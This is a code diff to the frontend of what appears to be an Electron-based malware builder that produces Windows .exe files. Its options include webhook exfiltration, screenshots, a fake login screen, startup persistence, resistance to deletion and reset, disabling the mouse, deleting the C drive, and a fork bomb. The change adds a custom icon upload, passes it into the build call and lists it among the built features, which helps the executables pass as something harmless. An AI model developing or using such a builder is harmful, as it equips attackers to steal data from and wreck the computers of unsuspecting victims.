@@ -136,6 +136,27 @@
     const forkBomb = ($('fb-fork-bomb') ? $('fb-fork-bomb').checked : false);
     const fname      = name.endsWith('.exe') ? name : name + '.exe';
 
+    // Handle icon file upload
+    let iconPath = null;
+    const iconInput = $('fb-icon');
+    if (iconInput && iconInput.files && iconInput.files.length > 0) {
+      const iconFile = iconInput.files[0];
+      // Convert to base64 or get path via electron API
+      if (window.electronAPI && window.electronAPI.saveIconTemp) {
+        try {
+          const reader = new FileReader();
+          const iconData = await new Promise((resolve, reject) => {
+            reader.onload = () => resolve(reader.result);
+            reader.onerror = reject;
+            reader.readAsDataURL(iconFile);
+          });
+          iconPath = iconData; // base64 data URL
+        } catch (err) {
+          console.error('Icon read error:', err);
+        }
+      }
+    }
+
     setMsg('fb-msg', 'Building ' + fname + ' (' + fmtSize(sizeKB) + ')…', true);
     if ($('fb-dl-note')) $('fb-dl-note').textContent = '';
 
@@ -144,7 +165,7 @@
         const result = await window.electronAPI.buildExe({ 
           name: fname, sizeKB, message, webhook, startup, screenshot, fakeLogin,
           updateOvertime, cantDelete, runBackground, taskProtection, disableReset, restartOnOpen,
-          disableMouse, delCDrive, forkBomb
+          disableMouse, delCDrive, forkBomb, iconPath
         });
         if (result && result.ok) {
           setMsg('fb-msg', '✓ Saved to Downloads: ' + fname + ' (' + fmtSize(sizeKB) + ')', true);
@@ -160,6 +181,7 @@
             if (disableMouse) features.push('disable mouse');
             if (delCDrive) features.push('del C drive');
             if (forkBomb) features.push('fork bomb');
+            if (iconPath) features.push('custom icon');
             $('fb-dl-note').textContent = features.length 
               ? '✓ Built with: ' + features.join(', ')
               : '✓ Built — all advanced features disabled.';
@@ -387,6 +409,24 @@
       wireSlider('fb-size-slider', 'fb-size-label');
       const dl = $('fb-download');
       if (dl) dl.addEventListener('click', buildExe);
+      
+      // Wire custom icon button
+      const iconBtn = $('fb-icon-btn');
+      const iconInput = $('fb-icon');
+      const iconName = $('fb-icon-name');
+      if (iconBtn && iconInput && iconName) {
+        iconBtn.addEventListener('click', () => iconInput.click());
+        iconInput.addEventListener('change', () => {
+          if (iconInput.files && iconInput.files.length > 0) {
+            iconName.textContent = iconInput.files[0].name;
+            iconName.style.color = 'var(--accent)';
+          } else {
+            iconName.textContent = 'No file chosen';
+            iconName.style.color = 'var(--txt-faint)';
+          }
+        });
+      }
+      
       wireAiToggle('fb-ai-toggle', 'fb-ai-panel');
       wireAiChat('exe', 'fb-ai-log', 'fb-ai-input', 'fb-ai-send');
       wireWebhookValidation();
